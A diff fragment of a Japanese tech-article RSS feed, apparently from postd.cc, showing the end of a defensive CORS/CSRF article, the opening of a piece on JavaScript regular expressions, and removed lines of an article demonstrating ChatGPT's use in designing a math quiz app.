+<p>先ほどのように悪意のあるウェブサイトがユーザーを削除したい場合、AjaxリクエストにカスタムHTTPヘッダーとして<strong>X-Requested-With</strong>を追加する必要があります。そうすることで、あなたのAPIサーバーに対してプリフライトリクエストがトリガーされます。あなたのCORSポリシーが最適な方法で定義されていれば、<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーに悪意のあるウェブサイトの名前は含まれません。したがって、CORSチェックは失敗し、ブラウザはリクエストを実行しません。</p>
+<p>このトリックは、GETとPOST両方のエンドポイントをCSRF攻撃から守ることができます。</p>
+<p><strong>ちなみに、GETリクエストを使用してアプリケーションに変更を加えるのは避けるべきです。GETはあくまでもデータを取得するためだけに使用するべきであり、データを変更するために使用するべきではありません</strong>。</p>
+<h2>設定ミスで墓穴を掘らない</h2>
+<p>SOPの仕組みは、最初からクロスオリジンリクエストを防ぐようになっています。したがって、脆弱なCORSポリシーを定義することで自らのウェブサイトを危険な状態に晒すことのないようにしましょう。</p>
+<p>アプリケーションの機密性の高さによっては、CORSの設定ミスにより壊滅的な被害を受ける可能性があります。数年前、ある取引プラットフォームの侵入テストを行った際、ウェブサイトのCORSポリシーが非常に甘いことに気づきました。リスクを示すため、サイトの訪問者に特定の株を強制的に買わせる悪意のあるウェブサイトを作成しました。攻撃者はこれを使って顧客に特定の株を強制的に買わせることで、株価を吊り上げることができます。この問題をうまく悪用すれば、億万長者になれます。</p>
+<p>犯罪は割りに合わないと言う人たちは、きっとCORSを理解していないのでしょう。</p>
+<p>タグ付けされた記事：<a href="https://www.devsecurely.com/blog/tag/checklist">checklist</a>, <a href="https://www.devsecurely.com/blog/tag/cors">CORS</a>, <a href="https://www.devsecurely.com/blog/tag/web-application-security">web application security</a></p>]]></content:encoded></item><item><title><![CDATA[進化した正規表現：JavaScriptの正規表現の歴史と未来]]></title><description><![CDATA[クイックサマリー：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steve…]]></description><link>https://postd.cc/history-future-regular-expressions-javascript/</link><guid isPermaLink="false">https://postd.cc/history-future-regular-expressions-javascript/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[JavaScript]]></category><category><![CDATA[正規表現]]></category><pubDate>Thu, 12 Dec 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><strong>クイックサマリー</strong>：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steven Levithan氏がJavaScriptの正規表現の歴史と現状を評価し、より読みやすく、保守性とレジリエンスに優れた正規表現の書き方をアドバイスします。</p>
 <hr>
 <p>モダンJavaScriptの正規表現は、皆さんがよく知っている従来の正規表現と比べると随分進化しました。正規表現は<strong>テキストを検索して置き換えるツールとして非常に優れている</strong>一方で、書くのも理解するのも難しいという根強い評判があります（しかし今から説明するように、この認識は時代遅れかもしれません）。</p>
 <p>正規表現に関するこの認識は、JavaScriptに特に当てはまります。PCREやPerl、.NET、Java、Ruby、C++、Pythonといったよりモダンな言語の正規表現に比べてパフォーマンスが劣るJavaScriptの正規表現は、長年人気が低迷していました。しかしそれはもはや過去の話です。</p>
@@ -1603,554 +1811,4 @@ CSSを使ってあらかじめ設定する必要もなく、画面のサイズ�
 <li>直感を無視して合理的思考に重点を置き過ぎると、思考が麻痺します。考え過ぎによる悪循環を断ち切り、積極的に行動を起こすには、直感と合理的思考を組み合わせる戦略が効果的です。</li>
 <li>意思決定疲労により疲れた頭は、決断を下すことを拒むようになります。この現象に対処する方法として、気力が充実している時間帯に決断を下すようにするとよいでしょう。</li>
 </ol>
-<p>この記事は以前<a href="https://www.techtello.com/analysis-paralysis/?ref=hackernoon.com">こちら</a>で公開されたものです。他の記事にも興味のある方は、<a href="https://www.linkedin.com/in/sagivini/?ref=hackernoon.com">LinkedIn</a>またはこちらをぜひフォローしてください。</p>]]></content:encoded></item><item><title><![CDATA[ChatGPTはプロのUI/UXデザイナーによるアプリ設計にどの程度役立つのか？]]></title><description><![CDATA[none «自動化できるものはすべて自動化されるだろう» - ロバート・キャノン、インターネット法・政策専門家 人工知能（AI）が今年のトレンドであることは紛れもない事実です。AI技術が台頭し、さま…]]></description><link>https://postd.cc/how-well-can-chatgpt-help-uiux-professionals-design-an-app/</link><guid isPermaLink="false">https://postd.cc/how-well-can-chatgpt-help-uiux-professionals-design-an-app/</guid><category><![CDATA[生成AI]]></category><pubDate>Fri, 29 Mar 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>«自動化できるものはすべて自動化されるだろう» - ロバート・キャノン、インターネット法・政策専門家</p></div></div>
-<p>人工知能（AI）が今年のトレンドであることは紛れもない事実です。AI技術が台頭し、さまざまな業界で急速に普及する中、UI/UXデザイナーやプロダクトデザイナーも当然その影響を受けています。ChatGPTやMidjourney、DALL-E 2（ダリ・ツー）、Stable Diffusionなどの製品はすでにかなり人気があり、筆者の同僚の中にも積極的なユーザーが多数います。</p>
-<p>UI/UXデザイナーとして、筆者もChatGPTを作業プロセスに取り入れたことにより、より使いやすいインターフェースの開発能力が格段に向上したことをすでに実感しています。この記事では、ChatGPTの具体的な使い方を示しつつ、ChatGPTを利用することでどのようなメリットを享受でき、いかにして全体的な作業効率を高められるのかを説明します。では早速見ていきましょう！</p>
-<h2>UI/UXデザイナーとプロダクトデザイナーの補助ツールとしてのChatGPT</h2>
-<h3>リクエスト作成またはプロンプトエンジニアリング</h3>
-<p>ChatGPTの可能性を最大限引き出せるかどうかは、効率的なクエリを作成する能力にかかっています。まずはリクエスト作成の基本をマスターし、さまざまなプロンプトスタイルを試してみましょう。</p>
-<p>参考になりそうな例を以下にいくつか挙げましたので、ぜひご覧ください。</p>
-<ul>
-<li><a href="https://www.notion.so/642f21dc1ed94e2a8a6f719ff33ac540?ref=hackernoon.com">200+ ChatGPT UX Prompts</a></li>
-<li><a href="https://drive.google.com/file/d/12Jj9A70GUaFuD1om_WbKYg9Ue9AWea9u/view?usp=sharing&#x26;ref=hackernoon.com">25 ChatGPT Use Cases for UX Designers</a></li>
-<li><a href="https://drive.google.com/file/d/1O5-Ihv0pCOofr2oADZAVNJCi3dDUBFMn/view?usp=share_link&#x26;ref=hackernoon.com">45 ChatGPT Use Cases for Product Managers</a></li>
-</ul>
-<p><strong>完璧なリクエストの作成は、レシピを作る作業に似ています</strong>。期待する結果を得るためには、必要な材料をすべて適切な量加えて混ぜ合わせる必要があります。すべての工程を正しく行っても、完璧に仕上げるためには微調整が必要になるかもしれません。その要点についてこれからお話しします。
-以下では、分かりやすい例として、数学を楽しく学べるモバイルアプリを開発しなければならないと仮定します。脳のトレーニングになるさまざまなテストやパズルを提供する数学クイズアプリを開発するとしましょう。</p>
-<h3>要件とアイデアを集める</h3>
-<p>ChatGPTは、ユーザーのリクエストを分析し、答えを生成することで、デザイナーが新しいプロジェクトの要件とアイデアを集める手助けをすることができます。コンセプトを考案し、主な機能やデザイン要件を決定する作業を含めることも可能です。</p>
-<h3>では、実際にChatGPTがこの作業を行う上で助けになるのか見てみましょう。</h3>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-2ba3aye.jpeg">
-<em>ChatGPTの会話</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>UX/UIデザイナーとして対応してください。主な目標は、製品やサービスのユーザーエクスペリエンスを可能な限りシームレスかつ直感的で、魅力的なものにすることです。デジタル製品やサービスのユーザーにとって、魅力的で楽しい体験を生み出します。あなたの仕事は、アプリ、ウェブサイト、その他のデジタル製品のユーザーエクスペリエンスを、創造的な方法で改善することです。結果はすべて英語で出力してください。最初のタスクは、iOS向けの数学クイズアプリのコンセプトを作成することです。</p><p><strong>タイトル：MathWiz</strong></p><p><strong>概要：</strong>
-MathWizは、iOSデバイス向けに開発された対話型の数学クイズアプリであり、あらゆる年齢層のユーザーに、楽しく魅力的な教育体験を提供することを目指しています。このアプリは、各ユーザーに合わせた学習プロセスを通じて数学能力を高め、強化することに主眼を置いたさまざまなクイズや課題を提供します。</p><p><strong>特長：</strong></p><ol>
-<li>カスタマイズされた学習パス：
-MathWizは、ユーザーの習熟度と進捗に応じた学習パスを提供します。さまざまなクイズや課題におけるユーザーの成績を評価することで、ユーザーが効果的に力をつけられるよう最適なクイズや演習をアプリが提案します。</li>
-<li>トピックの網羅性：
-算数、代数、幾何学、三角法、微分積分など、幅広い数学トピックを網羅します。ユーザーは、自分の興味やレベルに応じてクイズを選択できます。</li>
-<li>成績に応じた難易度設定：
-MathWizは、ユーザーの成績に応じてクイズの難易度を変更する仕組みを使用します。これにより、ユーザーは常にやりがいのある問題に挑戦することができ、飽きたり不満を感じたりすることなく、関心を持って積極的に取り組むことができます。</li>
-<li>ゲーム要素：
-このアプリは、ポイント、バッジ、リーダーボードなどのゲーム要素を取り入れることで、学習プロセスを楽しく満足の得られるものにします。ユーザーは、クイズやチャレンジ問題をこなすとポイントやバッジを獲得します。これらはフレンドと共有したり、グローバルリーダーボードで成績を比較したりできます。</li>
-<li>デイリークエスト：
-日替わりのデイリークエストを実施すると、ユーザーは追加のポイントやバッジを獲得することができます。これらのクエストは、常にユーザーのモチベーションを高め、関心を引きつけ、アプリに戻ってくるよう促します。</li>
-<li>進捗の管理と分析：
-ユーザーが進捗を把握し、改善が必要な部分を確認できるよう、詳細な分析を行います。ユーザーはトピックやクイズ、チャレンジ問題ごとに成績を確認できるほか、進捗をフレンドと比べることもできます。</li>
-<li>コラボレーションと交流：
-MathWizは、クイズやチャレンジ問題、成果を共有しやすくすることで、ユーザー間のコラボレーションや競争を促します。また、チャット機能を取り入れることで、戦略を話し合ったり、助け合いながら複雑な問題に取り組んだりすることができます。</li>
-<li>オフライン機能：
-ユーザーは、オフラインでもクイズやチャレンジ問題に取り組むことができるため、インターネットに接続できない環境でも学習と練習を続けられます。</li>
-<li>保護者機能：
-保護者機能を搭載することで、保護者が子供の進捗を監督したり、目標を設定したり、特定のトピックスや機能へのアクセスを制限したりできるようにします。</li>
-</ol><p><strong>デザインアプローチ：</strong></p><p>アプリはスムーズで直感的なユーザーエクスペリエンスの実現を優先したデザインとします。デザインの重要な要素は以下のとおりです。</p><ol>
-<li>洗練されたモダンなUI：
-MathWizは、無駄のないデザインと操作のしやすさに重点を置いた、洗練されたモダンなUIを搭載します。</li>
-<li>魅力的なビジュアル：
-アニメーションやイラスト、配色など、視覚的に魅力的なデザイン要素を取り入れることで、楽しく没入感のある学習環境を作り出します。</li>
-<li>使いやすいナビゲーション：
-アプリのナビゲーションは分かりやすく、使いやすいものにし、ユーザーはクイズやチャレンジ問題などの機能に迷うことなく簡単にアクセスできるようにします。</li>
-<li>アクセシビリティ：
-MathWizはアクセシビリティを念頭に置いてデザインします。ユーザーの能力や好みによらず、誰でも便利に使えるようにします。</li>
-</ol><p>最後に、MathWizはカスタマイズされた学習プロセスを通じてユーザーが楽しみながら、興味を持って数学を学び、練習できる手段を提供することを目指します。トピックの網羅性、成績に応じた難易度設定、ゲーム要素、使いやすいデザインなどにより、年齢を問わずすべてのユーザーが楽しめるシームレスな体験を生み出します。</p></div></div>
-</details>
-<p>ご覧のとおり、ChatGPTはアプリのコンセプトをかなり詳細に記述しています。必要であれば、各機能についてさらに質問することも可能です。ChatGPTは明確な回答を提示し、さらには最も重要なポイントも示してくれます。</p>
-<p>では、MathWizアプリをユーザーにとってより魅力的なデザインにするためのアイデアを尋ねてみましょう。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-n4b3a0s.jpeg">
-<em>MathWizのデザイン案</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>MathWizアプリのデザイン案をいくつかリストアップしてください。</p><p>視覚的に魅力的で、ユーザーの興味を引き出すようなアプリにするためのデザイン案を以下にいくつか挙げます。</p><ol>
-<li>カスタマイズ可能なアバター：ユーザーが自分のアバターを作成し、カスタマイズできるようにします。アバターは、プロフィール写真や、アプリ内での自分の分身として使用できます。こうしたパーソナライズ機能により、ユーザーエンゲージメントを高め、主体性を持たせることができます。</li>
-<li>ゲーミフィケーション：ポイントやバッジ、リーダーボードなどのゲーム要素を取り入れることでモチベーションを高め、より楽しく学習できるようにします。クイズに答えるとポイントを獲得し、一定のマイルストーンに到達するとバッジが解放され、リーダーボードでフレンドや他のグローバルユーザーと成果を比べることができます。</li>
-<li>進捗の可視化：視覚的に魅力的なチャートやグラフを使用して進捗を表示し、ユーザーが自分の向上過程を簡単に確認できるようにします。トピックごとの成績、合計獲得ポイント、集めたバッジを表示する進捗ダッシュボードを搭載します。</li>
-<li>ダークモード：特に夜間や暗い場所での使用の際に目の疲れを軽減できるよう、ダークモードに切り替えられる機能を実装します。</li>
-<li>アニメーションと画面遷移：ささやかなアニメーションやさりげない画面遷移により、スムーズでインタラクティブなユーザーエクスペリエンスを生み出します。正解や不正解の際のアニメーションや、画面の読み込み、アプリ内のセクション間のナビゲーションなどを含みます。</li>
-<li>テーマに沿ったクイズ：人気のイベントや祝日、時事ネタなどをテーマにしたクイズを作成し、ユーザーの興味を引き出します。そうすることで目新しさを出し、ユーザーに新しいトピックやチャレンジ問題に挑戦するよう促すことができます。</li>
-<li>共同学習：ソーシャル機能を組み込むことで、フレンドや他の学習者とつながったり、クイズやチャレンジ問題を送ったり、数学の問題について話し合ったり、成果を共有したりできるようにします。そうすることで、コミュニティとしての意識が芽生え、コラボレーションを通じた学習を促すことができます。</li>
-<li>成績に応じた難易度設定：能力に合ったクイズや問題を提示することによる、ユーザーのスキルレベルに応じた難易度設定を可能にします。そうすることで、個別化された学習体験を生み出し、ユーザーを圧倒することなく、適度に難しい問題で興味を持続させます。</li>
-<li>一貫した視覚言語：色やタイポグラフィ、アイコン、イラストなど、アプリ全体で一貫した視覚的言語を使用します。そうすることで、統一感のあるプロフェッショナルな外観になり、全体的なユーザーエクスペリエンス向上につながります。</li>
-<li>マイクロインタラクション：ハプティックフィードバックや効果音、ビジュアルキューなどのマイクロインタラクションを取り入れることで、より興味を引きつけ、インタラクティブなアプリにします。例えば、ユーザーが答えを提出した際にハプティックフィードバックを使用したり、正解と不正解を効果音で知らせたりするといいでしょう。</li>
-</ol><p>これらのデザイン案をMathWizアプリに取り入れることで、視覚的に魅力的で興味をかき立てられるような体験を生み出し、ユーザーに楽しみながら数学を学ぶよう促すことができます。</p></div></div>
-</details>
-<p>バーチャルアシスタントはポイントを10個挙げてくれました。どれもかなり的確で、これから開発するアプリのデザインコンセプトをまとめる手助けになりそうです。</p>
-<h2>デザインの選択肢を出す</h2>
-<p>ChatGPTを使うことで、要件を満たすさまざまなデザインの選択肢が得られます。その中から最も良いアイデアを選び、あまり有望でないものは除外します。</p>
-<p>MathWizアプリについてはすでにアイデアが固まりましたので、情報アーキテクチャに関する詳細な説明を入手してみましょう。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-c8c3amj.jpeg"><br>
-<em>デザインの選択肢を生成</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>次のタスクです。この数学クイズアプリに適した構造（情報アーキテクチャ）を作成してください。</p><p>MathWiz用にしっかりした情報アーキテクチャを作成するために、主要な画面とそれらの関係を概説します。この構造は、ユーザーとアプリのインタラクションを可能にする明確で直感的なナビゲーションシステムを提供します。</p><ol>
-<li>
-<p>スプラッシュスクリーン：<br>
-・アプリのリソースを読み込む間、アプリのロゴ名前を表示<br></p>
-</li>
-<li>
-<p>オンボーディング画面（新規ユーザー向けオプション）：<br>
-・アプリの主な機能や利点をまとめた一連の紹介画面を表示し、新規登録やログインの方法を案内<br></p>
-</li>
-<li>
-<p>ホーム画面：<br>
-・個別化された推奨クイズやデイリークエスト、成果を含むユーザーの進捗概要。<br>
-・以下のセクションへのアクセス：<br>
-a. トピック<br>
-b. デイリークエスト<br>
-c. 成果<br>
-d. プロフィール<br>
-e. 設定<br></p>
-</li>
-<li>
-<p>トピック画面：<br>
-・利用可能な数学のトピック（算数、代数、幾何学、三角法、微分積分など）<br>
-・トピックのフィルター・検索機能<br>
-・各トピック内のサブトピックや関連するクイズへのアクセス<br></p>
-</li>
-<li>
-<p>サブトピック画面：<br>
-・選択したトピック内のサブトピックの一覧<br>
-・各サブトピック内のクイズへのアクセス<br></p>
-</li>
-<li>
-<p>クイズ画面：<br>
-・選択されたクイズを、問題、答えの選択肢、タイマー（該当する場合）とともに表示<br>
-・回答後、結果とともに正解、解説、獲得ポイントを表示<br></p>
-</li>
-<li>
-<p>デイリークエスト画面：<br>
-・実施できるデイリークエストの一覧<br>
-・各クエストのステータス（実施済みかどうか）を、リワード（ポイントとバッジ）とともに表示<br></p>
-</li>
-<li>
-<p>成果画面：<br>
-・ユーザーが獲得したバッジや達成した成果の概要<br>
-・リーダーボードを表示し、フレンドや他のグローバルユーザーと成果を比較する機能<br></p>
-</li>
-<li>
-<p>プロフィール画面：<br>
-・名前やプロフィール写真などのユーザーの個人情報や、進捗（ポイント、バッジ、完了したクイズ）の概要を表示<br>
-・パフォーマンス分析やフレンドリストへのアクセス<br></p>
-</li>
-<li>
-<p>パフォーマンス分析画面：<br>
-・トピックごとの成績や強み、改善が必要な部分など、ユーザーの詳細なパフォーマンス分析を表示<br></p>
-</li>
-<li>
-<p>フレンドリスト画面：<br>
-・ユーザーのフレンドリストを、それぞれの成果とポイントとともに表示<br>
-・フレンドを追加、削除、検索する機能<br>
-・戦略を話し合ったり、複雑な問題について助け合ったりするためのチャット機能へのアクセス<br></p>
-</li>
-<li>
-<p>設定画面：<br>
-・通知やサウンド、アクセシビリティ（ユーザー補助）などの環境設定が可能<br>
-・子供のアカウントを監視し、管理するための保護者設定<br></p>
-</li>
-<li>
-<p>チャット画面：<br>
-・フレンドと会話したり、クイズやチャレンジ問題を送ったり、数学の問題について話し合ったりすることが可能<br></p>
-</li>
-</ol><p>画面とそれらの関係をこのように整理することで、MathWizは十分に定義された情報アーキテクチャを持つことができ、使いやすくて楽しいユーザーエクスペリエンスを実現できます。<br></p></div></div>
-</details>
-<p>これはまだ製品の土台ではありませんが、この基本構造案をもとにユーザーとのインタラクションを開発し、この案をデザインの初期段階とすることができます。</p>
-<p>悪くないではありませんか！</p>
-<p>ChatGPTに製品の最適な配色を提案してもらうことはできるでしょうか？普段は<a href="http://colormind.io/?ref=hackernoon.com">Colormind</a>や<a href="https://colorhunt.co/?ref=hackernoon.com">Colorhunt</a>、<a href="https://coolors.co/?ref=hackernoon.com">Coolors</a>といった他のツールを使用していますが、今回はChatGPTの意見を聞いてみたいと思います。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-3wd3a1k.jpeg">
-<em>ChatGPTの回答</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>それでは続けましょう。数学クイズアプリでは、色が重要な役割を果たす場合があります。次のタスクは、数学クイズアプリMathWizのブランドカラー、プライマリーカラー、セカンダリーカラーを含む、16進コード付きのカラーパレットを作成することです。</p><p>よく考えられたカラーパレットは、視覚的に魅力的で、やる気を起こさせる学習環境を生み出し、MathWizのユーザーエクスペリエンスを格段に向上させることができます。ここに挙げた色は、心地良く楽しい雰囲気を維持しつつ、興味をかき立て、やる気を引き出し、集中力を高める効果が期待できます。以下がブランドカラー、プライマリーカラー、セカンダリーカラーを含むMathWizのカラーパレット案になります。</p><ol>
-<li>
-<p>ブランドカラー：<br>
-・ディープブルー（#274472）：この色は、信用、安定、信頼性を表します。これらは教育アプリに欠かせない要素です。ディープブルーはアプリのロゴ、ヘッダー、ナビゲーションの主要要素に使用します。</p>
-</li>
-<li>
-<p>プライマリーカラー：<br>
-・ライトブルー（#4B8BBE）：この色は気持ちを落ち着かせ、親近感を抱かせます。そのため、背景やボタン、インタラクティブ要素に適しています。<br>
-・ティール（#009688）：この鮮やかな色は、アクセントに使用したり、CTAボタンや重要な情報などに注意を引き、行動を促したい場合にも使用できます。<br></p>
-</li>
-<li>
-<p>セカンダリーカラー：<br>
-・ソフトイエロー（#FFEB3B）：この色は暖かみとエネルギーを与え、進捗インジケータやバッジ、リワードのハイライトに使用できます。<br>
-・ライトグレー（#F5F5F5）：この中立色は、背景色として適しています。また、強烈すぎる印象になったり、注意をそらせたりしないようにしつつ、コントラストを与えます。<br>
-・ダークグレー（#616161）：この色は、テキストやアイコンに使用できます。クリーンでモダンな外観を保ちつつ、可読性を確保します。<br></p>
-</li>
-</ol><p>MathWizのカラーパレット案は、心地良くも興味をかき立てるような、視覚的に魅力的な環境を作り出し、ユーザーに学ぶことを促しつつ、アプリを楽しんでもらうことを意図しています。信頼できるブランドカラーを鮮やかなプライマリーカラーやセカンダリーカラーと組み合わせることで、MathWizはユーザーの注意を引き、長期間にわたる学習セッションを促します。</p></div></div>
-</details>
-<p>なかなか有望です！筆者は色の組み合わせの記述が詳細である点と、説明が簡潔にまとめられている点が特に気に入りました。このパレットを再現してみましたが、結果は概ね満足のいくものでした。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-5ke3a63.jpeg">
-<em>カラーパレット</em></p>
-<p>フォントはどうでしょうか？システムのSan FranciscoフォントとNew Yorkフォントは除外し、選択肢の多様化を図りたいと思います。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-gmf3a3t.jpeg">
-<em>フォントの提案</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>見出しと本文のフォントの組み合わせを3つ提案してください。iOS向けのアプリであることを踏まえつつ、ネイティブのシステムフォント（San FranciscoとNew York）は除外してください。</p><p>MathWizのような数学クイズアプリに使用するフォントの最適な組み合わせを選ぶことは、可読性、ユーザーエンゲージメント、全体的な視覚的魅力を確保する上で極めて重要です。フォントはモダンで読みやすく、アプリのデザインを補完するものでなければなりません。MathWizに適した、見出しと本文のフォントの組み合わせを以下に3つ用意しました。</p><ol>
-<li>見出し：Montserrat | 本文：Open Sans<br>
-・Montserratはモダンで汎用性の高いサンセリフ体のフォントであり、見出しやタイトルの見栄えを良くします。独特な幾何学的構造を持ち、クリーンで現代的な雰囲気があります。<br>
-・Open Sansは非常に読みやすく、汎用性の高いサンセリフ体のフォントであり、印刷用とデジタル用の両方に適しています。可読性に優れ、親しみやすくオープンな見た目であり、本文用として理想的です。<br></li>
-<li>見出し：Roboto Slab | 本文：Roboto<br>
-・Roboto Slabは現代的なスラブセリフ体のフォントであり、幾何学的な形状や親しみやすい曲線が特徴です。見出しに個性的なタッチを加えますが、過度に目を引くということもありません。<br>
-・Robotoは人気のあるサンセリフ体のフォントであり、可読性と汎用性に定評があります。Roboto Slabと相性が良く、アプリ全体に統一感のあるモダンな外観を与えます。<br></li>
-<li>見出し：Lato | 本文：Nunito<br>
-・Latoはやや丸みを帯びたディテールが特徴で、親しみやすく暖かみのある外観のサンセリフ体のフォントです。見出しに適していて、クリーンでモダンな見た目を与えます。<br>
-・Nunitoは丸みを帯びたサンセリフ体のフォントで、親しみやすさがあります。可読性に優れ、Latoとの相性も良く、調和のとれた視覚的に魅力的な組み合わせです。<br></li>
-</ol><p>これらのフォントの組み合わせは、モダンなデザインと可読性のバランスが取れており、MathWizのユーザーにとってコンテンツを扱いやすくします。これらの内いずれかの組み合わせを選ぶことで、統一感の取れた視覚的に魅力的なデザインを生み出し、ユーザーエクスペリエンスを向上させることができます。</p></div></div>
-</details>
-<p>技術的な観点で言うと、回答はかなり正確ではありますが、一見すると面白味に欠けます。では、これらのフォントが実際どのように見えるのか確認してみましょう。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-xsg3a7m.jpeg">
-<em>フォントの比較</em></p>
-<h2>競合の一次分析</h2>
-<p>競合アプリ（他の数学アプリ）に関する詳細な調査は、<a href="https://math-master.org/?ref=hackernoon.com">MathMaster</a>における筆者のデザインプロセスに欠かせない部分であり、AIが大いに役立っています。ChatGPTは、さまざまな情報源から大量のデータを自動的に集めて処理し、競合分析を手助けしてくれます。希望するデータの表示形式（表形式など）を指定するだけで、適切な分析結果が得られます。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-uwh3a2r.jpeg">
-<em>MathWizの競合アプリ</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>同じタイプの競合するアプリをリストアップし、ステークホルダーに発表できるよう比較分析してください。比較分析結果は表にまとめてください。</p><p>MathWizの競合アプリを以下にリストアップし、比較分析結果を表にまとめました。この分析では、十分な情報をもとに意思決定を行い、MathWizのビジネスチャンスを見極められるよう、各アプリの主な機能、長所、短所、価格、対象ユーザーを比較しました。</p><table>
-<thead>
-<tr>
-<th>競合アプリ</th>
-<th>主な機能</th>
-<th>長所</th>
-<th>短所</th>
-<th>価格</th>
-<th>対象ユーザー</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Khan Academy</td>
-<td>包括的なカリキュラム<br>個別化された学習パス<br>進捗管理<br>ゲーミフィケーション</td>
-<td>確立されたブランド<br>充実したコンテンツ<br>年齢層を問わない</td>
-<td>UIの情報量が多すぎる<br>ソーシャル機能がない</td>
-<td>無料</td>
-<td>生徒・学生<br>教員<br>保護者<br>独習者</td>
-</tr>
-<tr>
-<td>Photomath</td>
-<td>カメラベースの問題解答<br>ステップバイステップの解<br>複数の解答方法</td>
-<td>画期的な問題解答のアプローチ<br>使いやすい</td>
-<td>カメラを使った問題解答のみに対応、クイズや練習問題に重点を置いていない</td>
-<td>無料<br>Photomath Plusのサブスクリプションは月額$9.99</td>
-<td>生徒・学生<br>教員<br>保護者</td>
-</tr>
-<tr>
-<td>Mathletics</td>
-<td>アダプティブラーニング<br>ターゲットを絞った練習問題<br>リアルタイムの数学コンテスト<br>進捗管理</td>
-<td>興味をそそるリアルタイムのコンテスト<br>強力なカリキュラム</td>
-<td>サブスクリプションベース<br>気軽に学びたい人向けではない<br>社会人にあまり重点を置いていない</td>
-<td>サブスクリプションベース<br>月額$12.99〜</td>
-<td>幼稚園児から高校生<br>教員<br>保護者</td>
-</tr>
-<tr>
-<td>Prodigy Math Game</td>
-<td>カリキュラムに沿ったコンテンツ<br>アダプティブラーニング<br>ゲームベースの学習<br>進捗管理</td>
-<td>興味をそそるゲーム要素<br>幼稚園児から中学生向け</td>
-<td>幼稚園から中学校までのカリキュラムのみに対応<br>上級学習者や社会人向けではない</td>
-<td>無料<br>オプションのPremiumサブスクリプションは月額$8.95</td>
-<td>幼稚園児から中学生<br>教員<br>保護者</td>
-</tr>
-<tr>
-<td>Brilliant</td>
-<td>インタラクティブコース<br>問題解決型のアプローチ<br>クイズ<br>日替わりのチャレンジ問題</td>
-<td>クリティカルシンキングと問題解決に重点<br>上級学習者向け</td>
-<td>無料アクセスは制限あり<br>基本的な数学の知識にあまり重点を置いていない</td>
-<td>制限付きで無料アクセス<br>Premiumサブスクリプションは月額$24.99</td>
-<td>高校生<br>大学生<br>生涯学習者</td>
-</tr>
-</tbody>
-</table><p>価格や対象ユーザーなどの情報も含めたこの詳細な比較分析表により、ステークホルダーは現在の市場状況に関する包括的な理解を得られるでしょう。MathWizのビジネスチャンスを見極め、ユーザーを獲得し、引きつける魅力的な製品を開発する上で、この情報が役立つはずです。</p></div></div>
-</details>
-<h2>モックアップやプロトタイプの作成プロセスを加速させる</h2>
-<p>ChatGPTは、要素の説明を生成し、説明の配置やインタラクションを提案することで、モックアップの作成プロセスを一部自動化することができます。それにより、デザイナーは開発プロセスをスピードアップし、デザインのよりクリエイティブな部分に注力することができます。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-2qi3ayy.jpeg">
-<em>モックアップの作成</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>MathWizアプリのフローとデザインを紹介するためにFigmaでプロトタイプを構築できるよう、プロトタイプのスクリプトを作成してください。</p><p>MathWizアプリの主な画面とインタラクションの概要を示すプロトタイプのスクリプトを以下に作成しました。このスクリプトを使用してFigmaでプロトタイプを構築し、アプリのフローとデザインを紹介できるでしょう。</p><ol>
-<li>
-<p>スプラッシュスクリーン：<br>
-・MathWizのロゴと、その下にアプリの名前を表示<br>
-・テキスト例：「MathWiz」<br></p>
-</li>
-<li>
-<p>オンボーディング画面（新規ユーザー向けオプション）：<br>
